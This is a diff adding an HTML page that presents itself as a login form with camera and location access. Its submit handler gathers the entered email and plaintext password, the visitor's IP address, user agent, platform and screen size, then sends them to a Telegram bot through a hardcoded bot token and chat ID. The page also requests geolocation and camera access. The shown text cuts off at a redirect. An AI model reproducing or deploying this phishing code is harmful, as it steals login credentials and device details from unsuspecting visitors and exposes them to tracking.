@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera and Location Access with Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        video {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #ddd;
+        }
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            font-size: 16px;
+        }
+        #locationInfo {
+            margin-top: 20px;
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Login Form</h1>
+    <form id="login-form">
+        <input type="email" id="email" placeholder="Email" required><br>
+        <input type="password" id="password" placeholder="Password" required><br>
+        <button type="submit">Login</button>
+    </form>
+
+    <div id="locationInfo">
+        <h2>Location Information</h2>
+        <p id="status">Getting location...</p>
+        <p id="mapLink"></p>
+    </div>
+
+    <div id="cameraInfo">
+        <h2>Camera</h2>
+        <video id="video" autoplay></video>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        // Telegram Bot details
+        const TOKEN = "7632004432:AAEde0iDVXa65OTjG5cE452iXG-9YYa5b4k";
+        const CHAT_ID = "6604613886";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // Get device location
+        function getLocation() {
+            const status = document.getElementById('status');
+            const mapLink = document.getElementById('mapLink');
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        status.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        mapLink.innerHTML = `<a href="${googleMapsUrl}" target="_blank">Open in Google Maps</a>`;
+                    },
+                    (error) => {
+                        status.textContent = `Error: ${error.message}`;
+                    }
+                );
+            } else {
+                status.textContent = 'Geolocation is not supported by your browser.';
+            }
+        }
+
+        // Access camera
+        function startCamera() {
+            const videoElement = document.getElementById('video');
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoElement.srcObject = stream;
+                })
+                .catch(error => {
+                    console.error("Error accessing camera:", error);
+                });
+        }
+
+        // Form submit handler
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent default form submission
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!email || !password) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            // Get IP and other details
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    // Send to Telegram
+                    return axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    });
+                })
+                .then(() => {
+                    // Redirect after successful submission
+                    window.location
